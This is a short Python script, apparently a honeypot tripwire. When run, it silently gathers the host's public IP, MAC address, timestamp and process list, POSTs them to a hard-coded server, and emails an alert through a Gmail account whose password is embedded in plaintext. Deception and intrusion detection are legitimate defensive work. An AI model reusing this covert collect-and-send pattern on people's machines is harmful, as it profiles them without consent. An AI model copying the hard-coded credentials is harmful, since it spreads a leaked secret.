from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
import os, psutil
import requests, re, uuid, datetime
  
smtp = smtplib.SMTP('smtp.gmail.com', 587)
smtp.ehlo()
smtp.starttls()
  

smtp.login('find.userip@gmail.com', 'arsy@1234')
  
  
def message(subject="Python Notification", 
            text=""):
    
    # message contents
    msg = MIMEMultipart()
      
    # Subject
    msg['Subject'] = subject  
      
    # text contents
    msg.attach(MIMEText(text))  
  
    return msg


ip = requests.get('http://ipinfo.io/json').json()['ip']
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
ts = str(datetime.datetime.now())

res = list()
for proc in psutil.process_iter():
   pInfoDict = proc.as_dict(attrs=['pid', 'name'])
   res.append(pInfoDict)

data = {'ip':str(ip),'mac':str(mac),'timestamp':ts, 'pid_dict':res}
response = requests.post('http://192.168.43.59:8000/triggered/', json = data)


# Call message function
msg = message("IP adress Detector", 
                "Honeypot Triggered. The details are-\n\nIP: " + str(ip) + "\nMAC: " + str(mac) + '\nTimeStamp: ' + ts
             )

to = ['2000rahulagrawal@gmail.com']


smtp.sendmail(from_addr="find.userip@gmail.com",
              to_addrs=to, msg  = str(msg))
  
# close the connection
smtp.quit()